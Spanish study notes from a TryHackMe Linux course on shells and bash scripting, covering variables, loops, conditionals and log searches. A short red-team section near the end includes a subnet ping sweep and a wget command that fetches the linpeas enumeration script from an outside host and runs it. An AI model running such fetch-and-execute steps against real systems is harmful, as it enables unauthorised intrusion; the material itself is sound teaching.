---
tags:
  - linux
  - bash
  - scripting
  - shells
  - automatizacion
  - zsh
  - fish
fecha: 2026-07-01
ruta: SEC0
fuente: TryHackMe — Cyber Security 101 / Linux Fundamentals
---

# 🐚 Linux — Shells y Scripting

---

## Comandos Básicos de Navegación

```bash
pwd                 ← Print Working Directory: muestra dónde estás
cd Desktop          ← entrar a subdirectorio
cd ..               ← subir un nivel
cd /var/log         ← ir a ruta absoluta
ls                  ← listar contenido del directorio
cat archivo.txt     ← mostrar contenido de archivo
grep "palabra" archivo.txt   ← buscar texto en archivo
```

**Ejemplo de flujo básico:**
```bash
user@thm:~$ pwd
/home/user

user@thm:~$ ls
Desktop  Documents  Downloads  Music  Pictures

user@thm:~$ cd Documents
user@thm:~/Documents$ cat notas.txt
Estas son mis notas...

user@thm:~/Documents$ grep "THM" dictionary.txt
The flag is THM{...}
```

---

## Tipos de Shells en Linux

Una shell es el intérprete de comandos — el programa que lee lo que escribes y lo ejecuta. Linux tiene varias opciones.

### Ver tu shell actual

```bash
echo $SHELL         ← muestra la shell activa
cat /etc/shells     ← lista todas las shells instaladas en el sistema
```

### Cambiar de shell temporalmente

```bash
zsh        ← cambiar a zsh (mientras dure la sesión)
bash       ← volver a bash
fish       ← cambiar a fish
```

### Cambiar shell por defecto (permanente)

```bash
chsh -s /usr/bin/zsh     ← zsh como shell por defecto
chsh -s /bin/bash        ← bash como shell por defecto
```

---

## Comparativa: Bash vs Fish vs Zsh

| Característica | **Bash** | **Fish** | **Zsh** |
|---------------|----------|---------|---------|
| Nombre completo | Bourne Again Shell | Friendly Interactive Shell | Z Shell |
| **Default en** | La mayoría de distros Linux | No es default | No es default (macOS lo cambió a Zsh) |
| **Scripting** | ⭐⭐⭐ Amplio, bien documentado | ⭐ Limitado | ⭐⭐⭐ Excelente, combina lo mejor |
| **Tab completion** | Básica | Avanzada (sugiere basándose en historial) | Extensible con plugins |
| **Syntax highlighting** | ❌ No nativa | ✅ Integrado | Con plugins |
| **Corrección de errores** | ❌ No | ✅ Auto spell-correct | ✅ Auto spell-correct |
| **Personalización** | Básica | Buena (herramientas interactivas) | Avanzada (oh-my-zsh framework) |
| **User-friendliness** | Familiar pero no intuitivo | El más amigable | Muy bueno con configuración |
| **Historia de comandos** | ✅ `history` + flechas | ✅ | ✅ |

> [!tip] ¿Cuál usar?
> - **Bash**: cyberseguridad, servidores, compatibilidad máxima — la mayoría de scripts y CTFs asumen bash
> - **Zsh**: desarrollo, productividad, workstation personal con oh-my-zsh
> - **Fish**: usuarios nuevos que quieren algo bonito sin configuración
> - En pentesting/CTFs: **bash siempre disponible**, lo demás puede no estar instalado

---

## Shell Scripting en Bash

Un script de bash = archivo de texto con comandos que se ejecutan en secuencia. Automatiza tareas repetitivas.

### Estructura básica

```bash
#!/bin/bash          ← SHEBANG: indica qué intérprete usar

# Esto es un comentario
echo "Hola mundo"
```

**La línea shebang** (`#!`) es obligatoria. Indica al sistema qué intérprete usar para ejecutar el script:
- `#!/bin/bash` → bash
- `#!/bin/sh` → sh (POSIX shell)
- `#!/usr/bin/python3` → Python 3

### Crear y ejecutar un script

```bash
# 1. Crear el archivo
nano mi_script.sh

# 2. Dar permisos de ejecución
chmod +x mi_script.sh

# 3. Ejecutar
./mi_script.sh
```

> [!info] ¿Por qué `./` antes del nombre?
> `./` indica "ejecutar el archivo en el directorio actual". Sin esto, la shell busca el comando en el PATH (los directorios del sistema), no en el directorio actual, y no lo encontrará.

---

## Variables

Almacenan valores para reutilizarlos. Se definen sin espacios antes y después del `=`.

```bash
#!/bin/bash
nombre="Andres"          # asignar string
numero=42                # asignar número
ruta="/var/log"          # asignar ruta

echo "Hola $nombre"      # usar variable con $
echo "El número es: $numero"
echo "Logs en: $ruta"

# Entrada del usuario
echo "¿Cuál es tu nombre?"
read nombre_usuario       # leer input
echo "Bienvenido, $nombre_usuario"
```

**Salida:**
```
¿Cuál es tu nombre?
Andres
Bienvenido, Andres
```

---

## Bucles (Loops)

### `for` loop — Iterar sobre una secuencia

```bash
#!/bin/bash

# Iterar números del 1 al 10
for i in {1..10}; do
    echo $i
done
```

```bash
# Iterar sobre una lista de elementos
for host in 192.168.1.1 192.168.1.2 192.168.1.3; do
    ping -c 1 $host
done
```

```bash
# Iterar sobre archivos en un directorio
for archivo in /var/log/*.log; do
    echo "Procesando: $archivo"
    grep "ERROR" $archivo
done
```

**Estructura:**
```
for VARIABLE in LISTA; do
    COMANDOS
done
```

---

## Condicionales (if / elif / else)

```bash
#!/bin/bash

echo "Ingresa tu nombre:"
read nombre

if [ "$nombre" = "Stewart" ]; then
    echo "Bienvenido Stewart! Aquí está el secreto."
elif [ "$nombre" = "Admin" ]; then
    echo "Acceso de administrador."
else
    echo "Acceso denegado para: $nombre"
fi
```

**Estructura:**
```bash
if [ CONDICIÓN ]; then
    COMANDOS
elif [ OTRA_CONDICIÓN ]; then
    OTROS_COMANDOS
else
    COMANDOS_POR_DEFECTO
fi
```

### Operadores de comparación en bash

```bash
# Strings
[ "$a" = "$b" ]      ← igual
[ "$a" != "$b" ]     ← no igual

# Números
[ "$a" -eq "$b" ]    ← igual (equal)
[ "$a" -ne "$b" ]    ← no igual
[ "$a" -gt "$b" ]    ← mayor que (greater than)
[ "$a" -lt "$b" ]    ← menor que (less than)
[ "$a" -ge "$b" ]    ← mayor o igual
[ "$a" -le "$b" ]    ← menor o igual

# Archivos
[ -f "$archivo" ]    ← existe y es un archivo
[ -d "$directorio" ] ← existe y es un directorio
[ -r "$archivo" ]    ← tiene permiso de lectura

# Combinar condiciones
[ "$a" = "X" ] && [ "$b" = "Y" ]   ← AND
[ "$a" = "X" ] || [ "$b" = "Y" ]   ← OR
```

---

## Comentarios

Los comentarios empiezan con `#` y son ignorados por la shell. Documentan el código.

```bash
#!/bin/bash

# Script de verificación de acceso al locker
# Autor: Andres
# Fecha: 2026-07-01

# Definir variables
username=""
pin=""

# Pedir datos al usuario
echo "Usuario:"
read username

echo "PIN:"
read pin

# Verificar credenciales
if [ "$username" = "John" ] && [ "$pin" = "7385" ]; then
    echo "Acceso concedido."
else
    echo "Acceso denegado."
fi
```

> [!tip] Buena práctica: comentar secciones complejas, no cada línea
> Comenta el propósito de los bloques principales, no lo obvio. Demasiados comentarios hacen el código difícil de leer.

---

## Script Ejemplo — Sistema de Autenticación con Loop

Combina variables + loops + condicionales:

```bash
#!/bin/bash

# Variables para las credenciales requeridas
username=""
companyname=""
pin=""

# Loop para pedir 3 datos en secuencia
for i in {1..3}; do
    if [ "$i" -eq 1 ]; then
        echo "Usuario:"
        read username
    elif [ "$i" -eq 2 ]; then
        echo "Empresa:"
        read companyname
    else
        echo "PIN:"
        read pin
    fi
done

# Verificar si todos los datos son correctos
if [ "$username" = "John" ] && [ "$companyname" = "Tryhackme" ] && [ "$pin" = "7385" ]; then
    echo "Autenticación exitosa. Bienvenido, John."
else
    echo "Autenticación fallida."
fi
```

---

## Script de Búsqueda en Logs — Ejemplo Real

Un script que busca una keyword en archivos `.log` de un directorio:

```bash
#!/bin/bash

# Directorio donde buscar
directorio="/var/log"

# Palabra a buscar
keyword="thm-flag01-script"

# Buscar en todos los .log del directorio
for archivo in $directorio/*.log; do
    if grep -l "$keyword" "$archivo" 2>/dev/null; then
        echo "Encontrado en: $archivo"
        grep "$keyword" "$archivo"
    fi
done
```

---

## Relevancia en Ciberseguridad

### Blue Team
```bash
# Buscar IPs sospechosas en logs de Apache
grep "192.168.100." /var/log/apache2/access.log

# Contar intentos de login fallidos por IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# Script de monitoreo continuo
while true; do
    if grep -q "BANNED" /var/log/fail2ban.log; then
        echo "IP bloqueada detectada"
    fi
    sleep 60
done
```

### Red Team / Pentesting
```bash
# Script de escaneo de hosts en una subred
for ip in 192.168.1.{1..254}; do
    ping -c 1 -W 1 $ip > /dev/null 2>&1 && echo "$ip está activo"
done

# Descargar y ejecutar herramienta desde servidor
wget http://10.10.10.10:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
./tmp/linpeas.sh
```

---

## Resumen de Comandos y Construcciones

```bash
# Shells
echo $SHELL              # ver shell actual
cat /etc/shells          # shells disponibles
chsh -s /bin/zsh         # cambiar shell por defecto

# Script básico
#!/bin/bash              # shebang (primera línea)
chmod +x script.sh       # dar permisos de ejecución
./script.sh              # ejecutar

# Variables
variable="valor"         # asignar
echo $variable           # usar

# Input
read nombre              # leer input del usuario

# Condicional
if [ "$x" = "valor" ]; then
    echo "sí"
else
    echo "no"
fi

# Loop
for i in {1..10}; do
    echo $i
done

# Comentarios
# Esto es un comentario (ignorado por bash)
```

---

## Notas relacionadas

- [[Linux-Permisos-y-Sistema]] — chmod para dar permisos a scripts
- [[Linux-Herramientas-y-Admin]] — nano para editar scripts, cron para programarlos
- [[Windows-PowerShell]] — Scripting equivalente en Windows
- [[Ofensiva-Pentesting]] — Scripts bash para enumeración y post-explotación
- [[Defensiva-Blue-Team]] — Scripts bash para análisis de logs y detección
